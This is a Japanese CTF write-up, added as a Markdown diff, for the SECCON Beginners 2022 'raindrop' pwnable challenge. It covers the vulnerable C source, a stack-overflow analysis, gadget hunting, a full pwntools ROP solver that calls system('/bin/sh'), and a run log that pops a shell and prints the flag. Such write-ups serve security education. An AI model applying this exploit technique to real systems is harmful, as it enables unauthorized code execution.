@@ -1,0 +1,221 @@
+# raindrop
+
+問題のソースコードは以下。
+[SECCON Beginners CTF  raindrop](https://github.com/SECCON/Beginners_CTF_2022/tree/main/pwnable/raindrop)
+
+<details><summary>ソースコード</summary>
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define BUFF_SIZE 0x10
+
+void help() {
+    system("cat welcome.txt");
+}
+
+void show_stack(void *);
+void vuln();
+
+int main() {
+    vuln();
+}
+
+void vuln() {
+    char buf[BUFF_SIZE] = {0};
+    show_stack(buf);
+    puts("You can earn points by submitting the contents of flag.txt");
+    puts("Did you understand?") ;
+    read(0, buf, 0x30);
+    puts("bye!");
+    show_stack(buf);
+}
+
+void show_stack(void *ptr) {
+    puts("stack dump...");
+    printf("\n%-8s|%-20s\n", "[Index]", "[Value]");
+    puts("========+===================");
+    for (int i = 0; i < 5; i++) {
+	unsigned long *p = &((unsigned long*)ptr)[i];
+	printf(" %06d | 0x%016lx ", i, *p);
+	if (p == ptr)
+	    printf(" <- buf");
+	if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
+	    printf(" <- saved rbp");
+	if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
+	    printf(" <- saved ret addr");
+	puts("");
+    }
+    puts("finish");
+}
+
+__attribute__((constructor))
+void init() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    help();
+    alarm(60);
+}
+</details>
+    
+## 問題解決の見通し
+    
+bufのサイズが0x10で定義されているにも関わらずvuln関数で0x30まで書き込み可能になっている。ここにバッファオーバーフロー(BOF)の脆弱性が見いだせる。さらに、プログラム内にflag.txtを読みだすプログラムが存在していないこと、help関数内にsystem関数が存在していることからROPを用いてシェルを奪うことを考える。
+    
+## STEP1 スタックの配置を調べる
+    
+vuln関数のアセンブラを見ると最初の部分は次のようになっている。
+    
+```
+0000000000401206 <vuln>:
+  401206:       f3 0f 1e fa             endbr64
+  40120a:       55                      push   rbp
+  40120b:       48 89 e5                mov    rbp,rsp
+  40120e:       48 83 ec 10             sub    rsp,0x10
+```
+    
+ここからvuln関数においてスタックは0x10byteだけ確保されていることが分かる。よって、スタックの模式図は以下の通りとなる。
+    
+```
+|-------------------|<- rsp -+-----+
+|     BUFF_SIZE     |        |     |
+|       0x10        |        |     |
+|-------------------|<- rbp  |     |
+| saved_rbp   0x8   |--+    vuln   |
+|-------------------|  |     |     |
+| return_addr 0x8   |  |     |     |
+|-------------------|<-+    -+-----+
+| saved_rbp   0x8   |        |     |
+|-------------------|        |     |
+| return_addr 0x8   |       main   |
+|-------------------|        |     |
+|                   |        +-----+
+```
+
+ここから、bufからvuln関数のリターンアドレスまでは0x18byteの距離があることが分かる。従って、BOFを起こすにはこれだけの文字数を埋める必要がある。
+                         
+## STEP2 ROPの構想を立てる
+
+BOFの起こし方については把握できたので次はROPを行う計画を立てる。この問題はシェルを奪うことが目的であり、プログラム中にsystem関数が存在するのでROPを行って `system /bin/sh` が実行できればよい。今回はsystem関数がプログラム内に存在しているのでこれに関してはアドレスの指定だけで問題ない。課題となるのは引数である `/bin/sh` をどう埋め込むかである。アセンブラ内で関数の第一引数はrdiレジスタに保存されるので引数を準備して `pop rdi` でレジスタに収納していく。引数はBOFを行うときにaなどの代わりとしてスタックを埋めるのに使えば準備できる。具体的には次のようにする。
+
+```
+|-------------------|     |-----------------|
+|     BUFF_SIZE     |     |   '/bin/sh'     |
+|       0x10        |     |    +'\x00'      |
+|-------------------|     |     0x18        |
+| saved_rbp   0x8   |     |     (buf)       |
+|-------------------|---->|-----------------|
+| return_addr 0x8   |     | pop_rdi_addr 0x8|
+|-------------------|     |-----------------|
+| saved_rbp   0x8   |     | buf_addr 0x8    |
+|-------------------|     |-----------------|
+| return_addr 0x8   |     | system_addr 0x8 |
+|-------------------|     |-----------------|
+|                   |     |                 |
+```
+BOF後は次のように動作する。
+1.vuln関数実行終了
+リターンアドレスで `pop rdi` が実行
+```
+|-------------------|<--rsp
+|  buf_addr  0x8    |
+|-------------------|
+|  system_addr 0x8  |
+|-------------------| 
+|                   |
+    rdi = buf_addr(/bin/sh)
+```                       
+2.main関数実行終了
+リターンアドレスでsystem関数が実行
+このときの引数はrdiに入ったbuf_addr
+```
+|-------------------|<--rsp
+|  system_addr 0x8  |
+|-------------------|
+```
+## STEP3 ROPに必要な要素を集める
+                         
+続いて、ROPを実行するのに必要な材料を集めていく。ここで必要なのはsystem関数のアドレス、及びsystem関数に渡す引数のアドレスである。
+system関数のアドレスはobjdumpを用いて調べる。
+```
+00000000004011d6 <help>:
+  4011d6:       f3 0f 1e fa             endbr64
+  4011da:       55                      push   rbp
+  4011db:       48 89 e5                mov    rbp,rsp
+  4011de:       48 8d 3d 23 0e 00 00    lea    rdi,[rip+0xe23]        # 402008 <_IO_stdin_used+0x8>
+  4011e5:       e8 b6 fe ff ff          call   4010a0 <system@plt>
+  4011ea:       90                      nop
+  4011eb:       5d                      pop    rbp
+  4011ec:       c3                      ret
+```
+ここから、system関数のアドレスは0x4011e5となる。
+
+ `pop rdi` というガジェットはアセンブラ中に含まれていないが、 `pop rdi` を意味するバイナリ `5f c3` がアドレス `0x401453` にある。
+```
+$ objdump -d -M intel chall | grep -a1 5f | grep -b1 c3
+385-  401452:	41 5f                	pop    r15
+428:  401454:	c3                   	ret
+```
+## STEP4 ROP実行
+STEP2での計画通りにSTEP3で得た要素を用いてROPを組む。
+    
+### solver
+```
+import sys
+from pwn import *
+
+bin_file = './chall'
+context(os = 'linux', arch = 'amd64')
+
+system_addr = 0x4011e5
+pop_rdi = 0x401453
+
+def attack(conn, **kwargs):
+    #saved_rbpの値を取得してstackのアドレスを特定
+    conn.recvuntil(b'000002 | ')
+    saved_rbp = conn.recv(18)
+    print(saved_rbp, 0)
+    buf_addr = int(saved_rbp, 0) - 0x20 # 0x20はrbpとsaved_rbpの差分
+
+    buf1  = b'/bin/sh'.ljust(0x18, b'\00')
+    buf1 += pack(pop_rdi)
+    buf1 += pack(buf_addr)
+    buf1 += pack(system_addr)
+
+    conn.sendlineafter(b'understand?', buf1)
+
+
+def main():
+    #conn = remote('raindrop.quals.beginners.seccon.jp', 9001)
+    conn = process(bin_file)
+    attack(conn)
+    conn.interactive()
+
+
+if __name__ == '__main__':
+    main()
+```
+### 実行結果
+```
+[+] Starting local process './chall': pid 11704
+b'0x00007fff17c5c8a0' 0
+[*] Switching to interactive mode
+
+bye!
+stack dump...
+
+[Index] |[Value]
+========+===================
+ 000000 | 0x0068732f6e69622f  <- buf
+ 000001 | 0x0000000000000000
+ 000002 | 0x0000000000000000  <- saved rbp
+ 000003 | 0x0000000000401453  <- saved ret addr
+ 000004 | 0x00007fff17c5c880
+finish
+$ ls
+attack.py  chall  flag.txt  peda-session-cat.txt  src.c  welcome.txt
+$ cat flag.txt
+ctf4b{th053_d4y5_4r3_g0n3_f0r3v3r}
+$
+```
